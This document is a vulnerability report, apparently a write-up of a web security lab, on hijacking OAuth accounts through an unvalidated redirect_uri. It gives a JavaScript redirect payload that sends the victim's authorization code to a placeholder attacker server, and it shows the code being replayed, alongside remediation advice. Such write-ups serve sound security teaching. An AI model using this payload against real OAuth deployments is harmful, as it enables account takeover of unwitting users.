# Vulnerability Report: OAuth Account Hijacking via redirect_uri Manipulation

**Severity:** Critical
**CVSS Score:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L)
**Date:** 2026-08-07
**Target:** TARGET.web-security-academy.net

## Executive Summary
An OAuth account hijacking vulnerability was identified in the authentication flow of the application.
The OAuth provider fails to enforce strict validation on the `redirect_uri` parameter, accepting arbitrary external URLs without any allowlist check.
By manipulating the `redirect_uri` in the authorization request to point to an attacker-controlled server, the authorization code issued for the victim is delivered directly to the attacker via a GET request — and is silently logged in the server's access log.
Since the authorization code is sufficient to complete the OAuth flow and authenticate as the victim, the attacker gains full access to the victim's account with no credentials required.
This was demonstrated against the administrator account, achieving complete account takeover and the ability to perform destructive privileged actions on behalf of the victim.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | OAuth Authorization Code Interception via Unvalidated redirect_uri |
| Endpoint | `GET /auth` (OAuth provider) |
| Method | GET |
| Vulnerable Parameter | `redirect_uri` |
| Filter | None — arbitrary external URLs accepted without validation |
| Bypass | N/A — no restriction exists |
| Access Type | Authorization code delivered via GET request to attacker-controlled server |
| Privileges Required | None |
| User Interaction | Required (victim must open a crafted URL) |

## Steps to Reproduce
1. Initiate the OAuth login flow and intercept the authorization request to the OAuth provider:
```http
GET /auth?client_id=CLIENT_ID&redirect_uri=https://TARGET.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.net
```
2. Send the request to Repeater and replace the `redirect_uri` value with an attacker-controlled server URL.
3. Confirm the provider accepts the modified `redirect_uri` with no error — the value is reflected in the response.
4. Craft the following payload and host it on the attacker's server:
```html
<script>
  window.location = "https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://ATTACKER-SERVER/exploit&response_type=code&scope=openid%20profile%20email"
</script>
```
5. Deliver the exploit server URL to the victim.
6. When the victim opens the link, their active session with the OAuth provider is used silently — the provider issues an authorization code and redirects them to the attacker's server.
7. Retrieve the authorization code from the attacker's server access log.
8. Use the stolen code in the legitimate callback endpoint:
```http
GET /oauth-callback?code=STOLEN_CODE HTTP/2
Host: TARGET.web-security-academy.net
```
9. Confirm the application authenticates the attacker as the victim — full account takeover achieved.

## Proof of Concept
Exploit payload hosted on attacker's server:
```html
<script>
  window.location = "https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://ATTACKER-SERVER/exploit&response_type=code&scope=openid%20profile%20email"
</script>
```

Followed by replaying the stolen code:
```http
GET /oauth-callback?code=STOLEN_CODE HTTP/2
Host: TARGET.web-security-academy.net
```

## Impact
An unauthenticated attacker can achieve full account takeover of any user who has an active session with the OAuth provider by delivering a single crafted URL.
No credentials, no brute force, no prior access required.
The victim's browser silently completes the OAuth flow on the attacker's behalf — the authorization code arrives in the attacker's access log as a GET parameter.
This can lead to:
- Complete account takeover of any OAuth-authenticated user, including privileged accounts
- Unauthorized access to all account data, private content, and user actions
- Destructive actions performed on behalf of the victim — data deletion, account modification, privilege abuse
- Lateral movement if the compromised account has access to additional systems or APIs
- Silent exploitation — the victim has no indication the attack occurred

## Remediation
- **Enforce strict redirect_uri validation**: The OAuth provider must validate the `redirect_uri` against an exact allowlist registered per client application — no partial matches, no wildcard subdomains, no path traversal bypasses
- **Bind the code to the redirect_uri**: Store the `redirect_uri` used during authorization and verify it matches exactly when the code is exchanged for a token — even if an attacker steals a code, they cannot redeem it with a different URI
- **Implement the `state` parameter**: Use a cryptographically random, session-bound `state` value and validate it on callback — this prevents CSRF attacks on the OAuth flow and adds a second layer of protection
- **Short-lived, single-use authorization codes**: Codes should expire quickly (60 seconds or less) and be invalidated immediately after first use — limiting the window for replay attacks
- **Audit registered redirect URIs**: Regularly review and restrict the redirect URIs registered for each OAuth client to the minimum required set

## References
- OWASP: Testing for OAuth Weaknesses (WSTG-ATHZ-05)
- RFC 6749 — Section 10.6: Authorization Code Redirection URI Manipulation
- CWE-601: URL Redirection to Untrusted Site
- PortSwigger: OAuth authentication vulnerabilities — redirect_uri validation